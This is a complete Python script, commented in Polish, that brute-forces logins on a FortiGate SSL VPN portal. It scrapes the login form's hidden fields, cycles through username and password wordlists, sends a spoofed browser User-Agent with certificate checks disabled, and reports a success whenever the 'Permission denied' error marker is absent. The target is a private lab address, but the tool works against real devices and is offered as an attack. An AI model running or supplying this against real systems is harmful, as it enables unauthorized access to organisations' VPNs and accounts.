import requests # Biblioteka umozliwiajaca wykonywanie zapytan HTTP/HTTPS
import time # Biblioteka zastosowania do opoznien miedzy probami
from bs4 import BeautifulSoup # Pobieranie ukrytych pol formularza
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Wyłączenie ostrzezenia certyfikatu SSL

# Funkcja wczytująca dane (loginy lub hasła) z pliku tekstowego
def load_list_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()] # Pominiecie pustych lin
    except FileNotFoundError:
        print(f"Błąd: Plik {file_path} nie został znaleziony.")
        return []

# Funkcja pobierająca ukryte pola z formularza logowania FortiGate SSL VPN
def get_hidden_fields(target_ip, port):
    url = f"https://{target_ip}:{port}/remote/login"
    print(f"Pobieranie ukrytych pól z {url}")
    try:
        response = requests.get(url, verify=False) # Zapytanie GET do strony logowania
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser') # Parsowanie HTML
            hidden_fields = {}
            for hidden_input in soup.find_all('input', type='hidden'): # Szukanie wszystkich pól input typu "hidden"
                name = hidden_input.get('name')
                value = hidden_input.get('value', '')
                if name:
                    hidden_fields[name] = value
            print(f"Pobrano ukryte pola: {hidden_fields}")
            return hidden_fields
        print(f"Serwer zwrócił kod {response.status_code}, brak ukrytych pól.")
    except requests.exceptions.RequestException as e:
        print(f"Błąd podczas pobierania ukrytych pól: {e}")
    return {}

# Główna funkcja odpowiedzialna za atak brute-force
def brute_force_attack(target_ip, port, login_file, password_file, interval=5):
    login_list = load_list_from_file(login_file)
    password_list = load_list_from_file(password_file)

# Przerwanie, jeśli nie udało się załadować plików
    if not login_list or not password_list:
        print("Nie wczytano loginów lub haseł. Atak przerwany.")
        return

# Pobranie ukrytych pól z formularza logowania
    hidden_fields = get_hidden_fields(target_ip, port)
    if not hidden_fields:
        print("Nie udało się pobrać ukrytych pól. Atak przerwany.")
        return

    url = f"https://{target_ip}:{port}/remote/logincheck"
    print(f"Rozpoczęcie ataku na {url}")

# Nagłówki HTTP symulujące prawdziwą przeglądarkę
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

 # Przechodzenie przez każdą możliwą kombinację loginu i hasła
    for login in login_list:
        for password in password_list:
            data = {
                'username': login,
                'credential': password
            }
            data.update(hidden_fields) # Dodanie ukrytych pól wymaganych przez FortiGate

            try:
                response = requests.post(  # Wysłanie żądania logowania
                    url,
                    data=data,
                    headers=headers,
                    verify=False
                )

                # Analiza odpowiedzi – jeśli zawiera komentarz o błędzie, to hasło błędne
                if "<!--sslvpnerrmsg=Permission denied.-->" in response.text:
                    print(f"[-] BŁĄD: {login}:{password}")
                else:
                    print(f"[+] SUKCES: {login}:{password}")
                    return True  # Zakończ, jeśli trafiono prawidłowe dane

            except requests.exceptions.RequestException as e:
                print(f"[!] Błąd połączenia: {e}")

            time.sleep(interval) # Odczekanie przed kolejną próbą

    print("Brute-force zakończony, nie znaleziono poprawnych danych logowania.")
    return False

# Sekcja uruchamiająca cały proces
if __name__ == "__main__":
    target_ip = "192.168.0.106" 	# Adres IP FortiGate
    port = 1443 			# Port SSL VPN
    login_file = "logins.txt"		# Plik z loginami
    password_file = "passwords.txt" 	# Plik z hasłami
    # Uruchomienie funkcji brute-force
    brute_force_attack(target_ip, port, login_file, password_file)
